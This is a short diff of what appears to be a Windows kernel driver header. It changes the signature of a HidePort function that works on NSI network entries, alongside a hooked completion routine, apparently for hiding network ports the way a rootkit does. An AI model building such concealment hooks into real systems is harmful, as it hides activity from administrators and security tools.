@@ -33,8 +33,12 @@ struct HookedCompletionRoutine {
 };
 
 _IRQL_requires_max_(APC_LEVEL)
-NTSTATUS HidePort(_Inout_ PVOID entries, _In_ PNSI_PARAM nsiParameter, _Inout_ PNSI_STATUS_ENTRY statusEntries,
-	_Inout_ PNSI_PROCESS_ENTRY processEntries, _In_ SIZE_T index);
+NTSTATUS HidePort(_Inout_ PVOID entries, 
+	_In_ PNSI_PARAM nsiParameter, 
+	_Inout_ PNSI_STATUS_ENTRY statusEntries,
+	_Inout_ PNSI_PROCESS_ENTRY processEntries, 
+	_In_ SIZE_T index,
+	_In_ MODE mode);
 
 _IRQL_requires_max_(APC_LEVEL)
 _IRQL_requires_same_
